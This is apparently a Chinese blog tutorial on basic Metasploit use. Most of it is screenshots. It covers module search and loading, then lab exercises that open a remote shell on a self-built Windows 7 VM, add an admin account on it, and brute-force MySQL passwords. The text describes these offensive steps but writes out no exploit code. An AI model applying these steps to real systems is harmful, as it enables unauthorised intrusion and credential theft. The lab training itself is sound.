<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805152049233.png" alt="image-20210805152049233"></p>
<h2 id="三、Metasploit基本使用方法"><a href="#三、Metasploit基本使用方法" class="headerlink" title="三、Metasploit基本使用方法"></a>三、Metasploit基本使用方法</h2><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805164029799.png" alt="image-20210805164029799"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805164155781.png" alt="image-20210805164155781"></p>
<p>补充：在kali中启示</p>
<h4 id="3-1启动Metasploit"><a href="#3-1启动Metasploit" class="headerlink" title="3.1启动Metasploit"></a>3.1启动Metasploit</h4><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805164342101.png" alt="image-20210805164342101"></p>
<p>需要先启动postgresql数据库（不启动也会提示）</p>
<p>也可以在终端输入以下指令启动</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805164509235.png" alt="image-20210805164509235"></p>
<p>启动成功</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805164557539.png" alt="image-20210805164557539"></p>
<h4 id="3-2命令介绍"><a href="#3-2命令介绍" class="headerlink" title="3.2命令介绍"></a>3.2命令介绍</h4><p>输入help可以查看说明/模块</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805164858639.png" alt="image-20210805164858639"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805165823481.png" alt="image-20210805165642839"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805165357259.png" alt="image-20210805165357259"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805165510043.png" alt="image-20210805165510043"></p>
<p>目标：可以是网关/域名等等</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805165854584.png" alt="image-20210805165854584"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170001703.png" alt="image-20210805170001703"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170151441.png" alt="image-20210805170151441"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170226802.png" alt="image-20210805170226802"></p>
<h4 id="3-2-1search使用方法介绍"><a href="#3-2-1search使用方法介绍" class="headerlink" title="3.2.1search使用方法介绍"></a>3.2.1search使用方法介绍</h4><p>a.name</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170330750.png" alt="image-20210805170330750"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170407806.png" alt="image-20210805170407806"></p>
<p>补充：关键字可以是漏洞名称、软件、系统等等</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170518118.png" alt="image-20210805170518118"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170528473.png" alt="image-20210805170528473"></p>
<p>b.通过路径查找</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170558678.png" alt="image-20210805170558678"></p>
<p>c.缩写范围查找</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170639892.png" alt="image-20210805170639892"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170715597.png" alt="image-20210805170715597"></p>
<p>d.通过类型查找</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170738352.png" alt="image-20210805170738352"></p>
<p>e.联合查找</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805170804263.png" alt="image-20210805170804263"></p>
<p>f.根据CVE搜索漏洞模块</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171149293.png" alt="image-20210805171149293"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171210638.png" alt="image-20210805171210638"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171245881.png" alt="image-20210805171245881"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171321553.png" alt="image-20210805171321553"></p>
<h4 id="3-3模块相关的命令use的使用方法"><a href="#3-3模块相关的命令use的使用方法" class="headerlink" title="3.3模块相关的命令use的使用方法"></a>3.3模块相关的命令use的使用方法</h4><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171340764.png" alt="image-20210805171340764"></p>
<p>步骤1：找出漏洞模块</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171433346.png" alt="image-20210805171433346"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171500575.png" alt="image-20210805171500575"></p>
<p>步骤2：装载模块</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171759100.png" alt="image-20210805171759100"></p>
<p>补充：查看漏洞模块信息</p>
<p>法1：</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805171900407.png" alt="image-20210805171900407"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805172003858.png" alt="image-20210805172003858"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805172015257.png" alt="image-20210805172015257"></p>
<p>法2：进入模块后直接输入info</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805172134658.png" alt="image-20210805172134658"></p>
<p>步骤3：设置参数/启动</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805172326733.png" alt="image-20210805172326733"></p>
<h2 id="4-实战-使用msf渗透攻击Win7主机并远程执行命令"><a href="#4-实战-使用msf渗透攻击Win7主机并远程执行命令" class="headerlink" title="4.实战-使用msf渗透攻击Win7主机并远程执行命令"></a>4.实战-使用msf渗透攻击Win7主机并远程执行命令</h2><h4 id="4-1环境介绍"><a href="#4-1环境介绍" class="headerlink" title="4.1环境介绍"></a>4.1环境介绍</h4><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806101135845.png" alt="image-20210806101135845"></p>
<p>补充：需要自己搭建win7虚拟机</p>
<h4 id="4-2通过msf模块获取Win7远程shell"><a href="#4-2通过msf模块获取Win7远程shell" class="headerlink" title="4.2通过msf模块获取Win7远程shell"></a>4.2通过msf模块获取Win7远程shell</h4><p>流程说明</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806101253627.png" alt="image-20210806101253627"></p>
<p>​                                                            流程图</p>
<p>步骤1：对已知漏洞进行查看</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806101623365.png" alt="image-20210806101623365"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806101730568.png" alt="image-20210806101730568"></p>
<p>步骤2-3：模块查找与配置参数</p>
<p>步骤2.1查看auxiliary漏洞并配置的参数</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806101830245.png" alt="image-20210806101830245"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806102036473.png" alt="image-20210806102036473"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806102155654.png" alt="image-20210806102155654"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806101549498.png" alt="image-20210806101549498"></p>
<p>步骤2.2查看exploit并配置的参数</p>
<p>查找exploit</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806102809076.png" alt="image-20210806102809076"></p>
<p>查找模块与配置参数</p>
<p>加载模块</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806102856366.png" alt="image-20210806102856366"></p>
<p>查看模块</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806103200129.png" alt="image-20210806103200129"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806103431759.png" alt="image-20210806103431759"></p>
<p>步骤2.3查找payload并配置的参数</p>
<p>查找方法1：</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806103807459.png" alt="image-20210806103807459"></p>
<p>查找方法2：</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806103851072.png" alt="image-20210806103851072"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806103920476.png" alt="image-20210806103920476"></p>
<p>设置攻击载荷</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806104017012.png" alt="image-20210806104017012"></p>
<p>查看payload：show options</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806104125770.png" alt="image-20210806104125770"></p>
<p>配置参数</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806104833280.png" alt="image-20210806104833280"></p>
<p>接收者地址（监听者地址）</p>
<p>补充：再次show options查看是否所有参数都配置成功</p>
<p>步骤4：启动/攻击</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105101774.png" alt="image-20210806105101774"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105207507.png" alt="image-20210806105207507"></p>
<p>补充：</p>
<p>1.在攻击目标机上创建账号，这里账号与密码都是admin</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105338594.png" alt="image-20210806105338594"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105418980.png" alt="image-20210806105418980"></p>
<p>2.解决乱码</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105543056.png" alt="image-20210806105543056"></p>
<p>3.查看权限</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105641987.png" alt="image-20210806105641987"></p>
<p>4.退出：ctrl+c</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105714646.png" alt="image-20210806105714646"></p>
<p>5.渗透成功保存到后台</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105802990.png" alt="image-20210806105802990"></p>
<p>按回车是不会进入会话，需要查看后台并进入</p>
<p>查看</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105957409.png" alt="image-20210806105957409"></p>
<p>进入</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806110034282.png" alt="image-20210806110034282"></p>
<p>6.在攻击目标机上保存到后台（进入方法同上）</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806110138031.png" alt="image-20210806110138031"></p>
<p>7.会话操作（终结会话）</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806110350965.png" alt="image-20210806110350965"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806110444230.png" alt="image-20210806110444230"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806110527414.png" alt="image-20210806110527414"></p>
<h2 id="5-实战-使用msf扫描靶机上mysql服务密码"><a href="#5-实战-使用msf扫描靶机上mysql服务密码" class="headerlink" title="5.实战-使用msf扫描靶机上mysql服务密码"></a>5.实战-使用msf扫描靶机上mysql服务密码</h2><h4 id="5-1环境"><a href="#5-1环境" class="headerlink" title="5.1环境"></a>5.1环境</h4><p>启动kali和靶机</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806151606532.png" alt="image-20210806151606532"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152232078.png" alt="image-20210806152232078"></p>
<h4 id="5-2实战步骤"><a href="#5-2实战步骤" class="headerlink" title="5.2实战步骤"></a>5.2实战步骤</h4><p>步骤1：查找漏洞</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806151928117.png" alt="image-20210806151928117"></p>
<p>步骤2：加载模块</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152015786.png" alt="image-20210806152015786"></p>
<p>步骤3：修改参数与执行</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152034883.png" alt="image-20210806152034883"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152321135.png" alt="image-20210806152321135"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152335718.png" alt="image-20210806152335718"></p>
<p>步骤4：查看刑具/证明（数据）</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152538536.png" alt="image-20210806152538536"></p>
<h4 id="5-3将扫描的结果导出Metasploit与导入另外一台Metasploit中"><a href="#5-3将扫描的结果导出Metasploit与导入另外一台Metasploit中" class="headerlink" title="5.3将扫描的结果导出Metasploit与导入另外一台Metasploit中"></a>5.3将扫描的结果导出Metasploit与导入另外一台Metasploit中</h4><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152657897.png" alt="image-20210806152657897"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152817564.png" alt="image-20210806152817564"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152839548.png" alt="image-20210806152839548"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806153154656.png" alt="image-20210806153154656"></p>
<p>说明：这里没有开第二台Metasploit，但是选择清空了数据库数据</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806153453277.png" alt="image-20210806153453277"></p>
<p>通过hosts查看攻击记录（空）</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806153535935.png" alt="image-20210806153535935"></p>
<p>补充</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806153753152.png" alt="image-20210806153753152"></p>
<p>导入：（这里应该是下面这语句是xml而不是xmk）</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806153651358.png" alt="image-20210806153651358"></p>
<p>删除：</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806153915368.png" alt="image-20210806153915368"></p>
<p>拓展：添加nmap扫描记录</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806154424124.png" alt="image-20210806154424124"></p>
<p>-A：扫描所有类型，</p>
<p>xuegod.cn：目标网站</p>
<p>-oX：o输出，X文件类型，这里表示输出为文件类型</p>
<p>xuegod.xml：输出文件名与类型（没有会新建）</p>
<p>1.导入与查看</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806154634734.png" alt="image-20210806154634734"></p>
<p>2.查看服务</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806154748106.png" alt="image-20210806154748106"></p>
<p>查看特点主机的服务</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806154825587.png" alt="image-20210806154825587"></p>
<h2 id="6-命令补充"><a href="#6-命令补充" class="headerlink" title="6.命令补充"></a>6.命令补充</h2><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806154928791.png" alt="image-20210806154928791"></p>
